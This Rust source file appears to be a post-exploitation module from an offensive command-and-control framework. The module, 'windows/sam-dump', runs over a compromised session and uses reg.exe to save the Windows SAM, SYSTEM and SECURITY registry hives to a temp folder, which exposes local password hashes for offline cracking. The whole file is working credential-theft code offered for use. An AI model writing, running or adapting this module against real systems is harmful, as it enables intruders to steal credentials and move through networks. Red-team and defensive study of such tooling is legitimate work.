use crate::core::modules::Module;
use crate::core::loghandler::LogHandler;
use crate::cli::output::send_command_and_get_output_until;

pub struct SamDumpWindows;

impl Module for SamDumpWindows {
    fn name(&self) -> &'static str { "windows/sam-dump" }
    fn description(&self) -> &'static str { "Dump SAM/SECURITY/SYSTEM hives using reg.exe (SYSTEM required)" }
    fn usage(&self) -> &'static str { "Usage: run-module windows/sam-dump <session_id>" }
    fn platform(&self) -> &'static str { "windows" }
    fn category(&self) -> &'static str { "credentials" }
    fn run(&self, session_id: usize, session_manager: &crate::core::session::SessionManager, _args: Vec<String>) {
        if let Some(session) = session_manager.get(session_id) {
            let marker = "__AEGIS_END__";
            let cmd = format!(
                "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.save /y; reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.save /y; reg save HKLM\\SECURITY C:\\Windows\\Temp\\security.save /y; echo {}\n",
                marker
            );
            match send_command_and_get_output_until(&session, &cmd, marker) {
                Ok(data) => {
                    if let Some(idx) = data.windows(marker.len()).rposition(|window| window == marker.as_bytes()) {
                        let output = &data[..idx];
                        println!("{}", String::from_utf8_lossy(output));
                        LogHandler::success("Dumped SAM/SYSTEM/SECURITY hives to C:\\Windows\\Temp\\*.save")
                    } else {
                        LogHandler::error("End marker not found in output");
                    }
                }
                Err(e) => LogHandler::error(&format!("Failed to dump SAM/SYSTEM/SECURITY: {}", e)),
            }
        }
    }
}